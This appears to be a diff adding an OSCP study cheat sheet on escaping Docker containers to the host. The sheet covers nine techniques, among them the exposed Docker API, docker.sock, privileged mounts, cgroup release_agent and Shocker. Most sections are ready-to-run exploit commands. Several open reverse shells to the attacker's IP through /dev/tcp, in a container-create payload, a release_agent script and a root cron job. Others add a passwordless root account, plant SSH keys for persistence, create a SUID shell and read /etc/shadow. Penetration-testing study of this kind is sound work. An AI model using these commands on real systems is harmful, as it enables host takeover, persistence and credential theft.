@@ -1,0 +1,366 @@
+Docker Escape Techniques — OSCP Reference
+
+Note: These techniques assume you have already obtained a shell inside a Docker container and are attempting to escape to the host system.
+
+
+Table of Contents
+
+Unauthenticated Docker API (Port 2375)
+Privileged Container — Mount Host Filesystem
+Docker Socket Exposed Inside Container
+Sensitive Host Directory Mounts
+Capabilities Abuse — CAP_SYS_ADMIN
+Capabilities Abuse — CAP_DAC_READ_SEARCH (Shocker)
+cgroup Release Agent Escape
+Writable /etc/cron.d or Host Cron Jobs
+Namespace Escape via nsenter
+Detection Checklist
+
+
+1. Unauthenticated Docker API (Port 2375)
+What it is: Docker daemon exposed over TCP with no authentication. Gives full Docker control remotely — instant root on the host.
+Detection:
+# From outside the container / during enumeration
+nmap -p 2375,2376 <target>
+curl http://<target>:2375/version
+Check the KernelVersion field in the response:
+
+linux kernel string → native Linux host, mount /
+microsoft-standard-WSL2 string → Windows host running Docker Desktop, mount /mnt/host/c
+
+Exploitation — Linux Host:
+# 1. Confirm API access and list images
+curl http://<target>:2375/images/json
+
+# 2. Create container with host root filesystem mounted
+curl -X POST http://<target>:2375/containers/create \
+  -H "Content-Type: application/json" \
+  -d '{
+    "Image": "alpine:latest",
+    "Cmd": ["/bin/sh", "-c", "cat /mnt/root/root/root.txt"],
+    "HostConfig": {
+      "Binds": ["/:/mnt/root"]
+    },
+    "Privileged": true
+  }' | jq .Id
+
+# 3. Start the container
+curl -X POST http://<target>:2375/containers/<container_id>/start
+
+# 4. Retrieve output
+curl "http://<target>:2375/containers/<container_id>/logs?stdout=true"
+
+Exploitation — Windows Host (Docker Desktop / WSL2):
+# C: drive is exposed at /mnt/host/c inside WSL2
+# Write the JSON payload to a file and serve it
+cat > /tmp/container.json << 'EOF'
+{
+  "Image": "alpine:latest",
+  "Cmd": ["/bin/sh", "-c", "cat /mnt/host_root/Users/Administrator/Desktop/root.txt"],
+  "HostConfig": {
+    "Binds": ["/mnt/host/c:/mnt/host_root"]
+  },
+  "Tty": true,
+  "OpenStdin": true
+}
+EOF
+
+# Serve it and pull it from the target
+cd /tmp && python3 -m http.server 8000
+
+# On the target — download and create container
+curl -X POST http://<target>:2375/containers/create \
+  -H "Content-Type: application/json" \
+  -d @container.json | jq .Id
+
+# Start and read logs same as Linux method above
+curl -X POST http://<target>:2375/containers/<container_id>/start
+curl "http://<target>:2375/containers/<container_id>/logs?stdout=true"
+
+Get a reverse shell instead of just reading files:
+curl -X POST http://<target>:2375/containers/create \
+  -H "Content-Type: application/json" \
+  -d '{
+    "Image": "alpine:latest",
+    "Cmd": ["/bin/sh", "-c", "apk add bash && bash -i >& /dev/tcp/<your_ip>/<port> 0>&1"],
+    "HostConfig": {
+      "Binds": ["/:/mnt/root"],
+      "NetworkMode": "host"
+    },
+    "Privileged": true
+  }'
+
+
+2. Privileged Container — Mount Host Filesystem
+What it is: Container running with --privileged flag has full access to host devices. Can mount the host's root disk directly.
+Detection (from inside container):
+# Check if privileged
+cat /proc/self/status | grep CapEff
+# Full capabilities = CapEff: 0000003fffffffff (or similar large value)
+
+# Alternatively
+ip link add dummy0 type dummy 2>/dev/null && echo "Privileged" || echo "Not privileged"
+
+# List host block devices
+fdisk -l
+lsblk
+
+Exploitation:
+# Find the host disk (usually /dev/sda1, /dev/xvda1, etc.)
+fdisk -l
+
+# Mount the host root filesystem
+mkdir /mnt/host
+mount /dev/sda1 /mnt/host
+
+# Read sensitive files
+cat /mnt/host/root/root.txt
+cat /mnt/host/etc/shadow
+
+# Add your SSH key for persistence
+echo "ssh-rsa <your_pubkey>" >> /mnt/host/root/.ssh/authorized_keys
+
+# Or write a SUID shell
+cp /bin/bash /mnt/host/tmp/bash
+chmod 4755 /mnt/host/tmp/bash
+# Then on host: /tmp/bash -p
+
+One-liner if you know the device:
+mount /dev/sda1 /mnt/host && chroot /mnt/host /bin/bash
+
+
+3. Docker Socket Exposed Inside Container
+What it is: /var/run/docker.sock is bind-mounted into the container. Allows you to talk to the Docker daemon and create new privileged containers.
+Detection:
+ls -la /var/run/docker.sock
+# Should show: srw-rw---- ... /var/run/docker.sock
+
+# Confirm you can interact with it
+curl --unix-socket /var/run/docker.sock http://localhost/version
+
+Exploitation with Docker CLI (if installed):
+# Spin up a new privileged container mounting host root
+docker run -it -v /:/mnt/host --privileged alpine chroot /mnt/host /bin/bash
+
+Exploitation without Docker CLI (curl over socket):
+# Create a privileged container
+curl --unix-socket /var/run/docker.sock \
+  -X POST http://localhost/containers/create \
+  -H "Content-Type: application/json" \
+  -d '{
+    "Image": "alpine:latest",
+    "Cmd": ["/bin/sh", "-c", "cat /mnt/host/root/root.txt"],
+    "HostConfig": {
+      "Binds": ["/:/mnt/host"],
+      "Privileged": true
+    }
+  }' | jq .Id
+
+curl --unix-socket /var/run/docker.sock \
+  -X POST http://localhost/containers/<id>/start
+
+curl --unix-socket /var/run/docker.sock \
+  "http://localhost/containers/<id>/logs?stdout=true"
+
+Exploitation with nsenter (clean host shell):
+# Get the PID of a host process (PID 1 is init)
+docker run -it --privileged --pid=host alpine nsenter -t 1 -m -u -i -n -p -- /bin/bash
+# You now have a shell in the HOST's namespaces
+
+
+4. Sensitive Host Directory Mounts
+What it is: Host directories mounted into the container that contain sensitive data or allow privilege escalation.
+Detection:
+# Check what's mounted
+cat /proc/mounts
+mount | grep -v "cgroup\|proc\|sys\|dev\|tmpfs"
+
+# Common juicy mounts to look for
+ls /host /mnt /data /backup /root /etc /home 2>/dev/null
+
+High-value mounts and what to do with them:
+Mounted Path  | Attack
+/etc          | Overwrite /etc/passwd or /etc/cron.d
+/root         | Read SSH keys, .bash_history, flags
+/home         | Read user SSH keys
+/var/spool/cron | Write a cron job
+/usr/local/bin | Replace a binary with a reverse shell
+
+If /etc is mounted:
+# Add a root user with no password to /etc/passwd
+echo "pwned::0:0:root:/root:/bin/bash" >> /etc/passwd
+
+# On the host, su to the new user
+su pwned
+
+If SSH keys are accessible:
+cat /host/root/.ssh/id_rsa
+# Copy the key and SSH directly to the host
+
+
+5. Capabilities Abuse — CAP_SYS_ADMIN
+What it is: Container has CAP_SYS_ADMIN capability, which allows mounting filesystems and other privileged operations — functionally similar to --privileged.
+Detection:
+capsh --print | grep sys_admin
+# or
+cat /proc/self/status | grep CapEff
+# Decode the hex value:
+capsh --decode=<CapEff_value>
+
+Exploitation via cgroup notify_on_release:
+# Create a cgroup
+mkdir /tmp/cgrp && mount -t cgroup -o rdma cgroup /tmp/cgrp && mkdir /tmp/cgrp/x
+
+# Enable notify_on_release
+echo 1 > /tmp/cgrp/x/notify_on_release
+
+# Get the overlay path for the container
+host_path=$(sed -n 's/.*\perdir=\([^,]*\).*/\1/p' /etc/mtab)
+
+# Write a payload to execute on the host
+echo "$host_path/cmd" > /tmp/cgrp/release_agent
+echo '#!/bin/sh' > /cmd
+echo "cat /root/root.txt > $host_path/output" >> /cmd
+chmod a+x /cmd
+
+# Trigger execution
+sh -c "echo \$\$ > /tmp/cgrp/x/cgroup.procs"
+sleep 1
+cat /output
+
+
+6. Capabilities Abuse — CAP_DAC_READ_SEARCH (Shocker)
+What it is: CAP_DAC_READ_SEARCH allows bypassing file read permission checks. Can be used to read arbitrary files on the host via the open_by_handle_at syscall — known as the "Shocker" attack.
+Detection:
+capsh --print | grep dac_read_search
+
+Exploitation:
+# Compile and run the Shocker PoC
+# Source: https://github.com/gabrtv/shocker
+
+gcc -o shocker shocker.c
+./shocker /etc/shadow /tmp/shadow_output
+cat /tmp/shadow_output
+
+Note: This is read-only. You can exfiltrate files but cannot write to the host directly with this capability alone.
+
+
+7. cgroup Release Agent Escape
+What it is: If the container can create/write cgroup release agents and has the necessary capabilities, commands execute on the host when a cgroup is released.
+Detection:
+# Check if we can mount cgroups
+mount -t cgroup -o rdma cgroup /tmp/test 2>/dev/null && echo "Mountable"
+
+# Check capabilities
+cat /proc/self/status | grep CapEff
+
+Exploitation (same as CAP_SYS_ADMIN above — cgroup method):
+mkdir /tmp/cgrp
+mount -t cgroup -o rdma cgroup /tmp/cgrp
+mkdir /tmp/cgrp/x
+echo 1 > /tmp/cgrp/x/notify_on_release
+
+# Get container path on host
+host_path=$(sed -n 's/.*\perdir=\([^,]*\).*/\1/p' /etc/mtab)
+echo "$host_path/evil.sh" > /tmp/cgrp/release_agent
+
+# Create reverse shell payload
+cat > /evil.sh << 'EOF'
+#!/bin/bash
+bash -i >& /dev/tcp/<your_ip>/<port> 0>&1
+EOF
+chmod +x /evil.sh
+
+# Trigger it
+sh -c "echo \$\$ > /tmp/cgrp/x/cgroup.procs"
+
+
+8. Writable /etc/cron.d or Host Cron Jobs
+What it is: If the container has a sensitive host directory mounted (see section 4), you may be able to write a cron job that executes on the host.
+Detection:
+# Check if cron directories are writable
+ls -la /etc/cron.d /var/spool/cron/crontabs 2>/dev/null
+cat /proc/mounts | grep cron
+
+Exploitation:
+# Write a reverse shell cron job (executes every minute as root on host)
+echo "* * * * * root bash -i >& /dev/tcp/<your_ip>/<port> 0>&1" > /etc/cron.d/pwned
+
+# Set listener on your machine
+nc -lvnp <port>
+
+
+9. Namespace Escape via nsenter
+What it is: If you have enough privileges, nsenter lets you enter host namespaces directly without needing to mount anything.
+Detection:
+which nsenter
+# Requires --privileged or CAP_SYS_ADMIN typically
+
+Exploitation:
+# Enter all host namespaces (requires privileged or access to host PID 1)
+nsenter -t 1 -m -u -i -n -p -- /bin/bash
+
+# Flags:
+# -t 1      = target PID 1 (host init process)
+# -m        = mount namespace
+# -u        = UTS namespace (hostname)
+# -i        = IPC namespace
+# -n        = network namespace
+# -p        = PID namespace
+
+
+Detection Checklist
+Run these from inside any container shell to enumerate escape vectors:
+
+# === ENVIRONMENT ===
+hostname
+cat /etc/os-release
+uname -a   # WSL2 kernel = Windows host
+
+# === PRIVILEGES ===
+id
+whoami
+cat /proc/self/status | grep -E "Cap(Inh|Prm|Eff|Bnd)"
+capsh --print 2>/dev/null
+
+# === PRIVILEGED CONTAINER ===
+cat /proc/self/cgroup
+ip link add dummy0 type dummy 2>/dev/null && echo "[!] Privileged container"
+
+# === DOCKER SOCKET ===
+ls -la /var/run/docker.sock 2>/dev/null && echo "[!] Docker socket found"
+
+# === MOUNTS ===
+cat /proc/mounts
+mount | grep -v "cgroup\|proc\|sys\|dev\|tmpfs\|shm"
+
+# === BLOCK DEVICES (privileged) ===
+fdisk -l 2>/dev/null
+lsblk 2>/dev/null
+
+# === NETWORK — look for Docker API ===
+ss -tlnp 2>/dev/null || netstat -tlnp 2>/dev/null
+# Also check from outside: nmap -p 2375,2376 <target>
+
+# === WRITABLE SENSITIVE PATHS ===
+ls -la /etc/cron* /var/spool/cron /root /host /mnt 2>/dev/null
+
+# === TOOLS AVAILABLE ===
+which docker curl wget python3 nc ncat socat nsenter capsh 2>/dev/null
+
+
+Quick Reference Summary
+
+Technique                          | Key Indicator                    | Difficulty
+-----------------------------------|----------------------------------|----------
+Unauthenticated Docker API (2375)  | Port 2375 open, no auth          | Easy
+Privileged container + mount       | --privileged flag                | Easy
+Docker socket exposed              | /var/run/docker.sock exists      | Easy
+Sensitive host mounts              | /etc, /root, etc. mounted        | Easy–Med
+CAP_SYS_ADMIN abuse                | CapEff includes sys_admin        | Medium
+CAP_DAC_READ_SEARCH (Shocker)      | CapEff includes dac_read_search  | Medium
+cgroup release agent               | Can mount cgroups                | Medium
+Host cron via mount                | Writable cron path on host       | Medium
+nsenter namespace escape           | Privileged + nsenter available   | Medium
+
+Generated for OSCP prep — always verify technique applicability in the context of the target box.
